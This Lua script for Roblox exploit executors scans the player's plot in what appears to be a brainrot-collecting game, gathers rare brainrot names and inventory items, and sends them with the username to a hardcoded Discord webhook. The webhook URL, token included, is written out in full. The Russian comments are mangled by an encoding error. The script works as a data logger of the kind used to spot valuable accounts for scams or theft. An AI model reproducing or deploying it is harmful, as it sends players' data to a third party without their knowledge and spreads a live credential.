local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer

-- –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ HTTP
local function sendWebhook(data)
    local req = (syn and syn.request) or (request) or (http_request) or (fluxus and fluxus.request)
    if not req then
        warn("‚ùå HTTP request —Ñ—É–Ω–∫—Ü–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!")
        return
    end

    req({
        Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

-- === –ü–æ–∏—Å–∫ —Å–≤–æ–µ–≥–æ –ø–ª–æ—Ç–∞ ===
local function findPlayerPlot()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    for _, plot in ipairs(plots:GetChildren()) do
        local label = plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") and plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
        if label and label.Text == localPlayer.DisplayName then return plot end
    end
    return nil
end

-- === Brainrots —Ñ–∏–ª—å—Ç—Ä ===
local allowedBrainrots = {
    "Los Tralaleritos","Garamararam","Vacca Saturno Saturnita",
    "Blueberrinni Octopussini","67","Pot Hotspot",
    "Dragon Cannelloni","Brri Brri Dicus Bombicus","Crazylone Pizalone"
}

local function collectBrainrots(plot)
    local text = ""
    local container = plot and plot:FindFirstChild("Brainrots")
    if not container then return "" end
    for i = 1,17 do
        local node = container:FindFirstChild(tostring(i))
        if node and node:FindFirstChild("Brainrot") then
            local ui = node.Brainrot:FindFirstChild("PlatformUI")
            if ui and ui:FindFirstChild("Title") then
                local t = ui.Title.Text
                for _, allowed in ipairs(allowedBrainrots) do
                    if t and string.find(t, allowed) then
                        text = text .. ("Brainrot %d: %s\n"):format(i, t)
                        break
                    end
                end
            end
        end
    end
    return text
end

-- === –ò–Ω–≤–µ–Ω—Ç–∞—Ä—å (–±–µ–∑ Shovel –∏ Bat) ===
local function collectInventory()
    local items = {}
    local function add(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                local nameLower = item.Name:lower()
                if not string.find(nameLower,"shovel") and not string.find(nameLower,"bat") then
                    table.insert(items,item.Name)
                end
            end
        end
    end
    add(localPlayer:FindFirstChild("Backpack"))
    add(localPlayer.Character)
    if #items == 0 then return "" end
    local invText = "\n--- Inventory ---\n"
    for _, v in ipairs(items) do invText = invText .. "- "..v.."\n" end
    return invText
end

-- === –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä ===
local plot = findPlayerPlot()
local combined = collectBrainrots(plot) .. collectInventory()
if combined == "" then combined = "‚ö†Ô∏è –ü—É—Å—Ç–æ" end

-- === –û—Ç–ø—Ä–∞–≤–∫–∞ ===
sendWebhook({
    ["embeds"] = {{
        ["title"] = "**Brainrots + Inventory Report**",
        ["color"] = 65280,
        ["fields"] = {
            {["name"]="üë§ Username",["value"]=localPlayer.Name,["inline"]=false},
            {["name"]="ü™ê Brainrots + Inventory",["value"]=combined,["inline"]=false}
        }
    }}
})
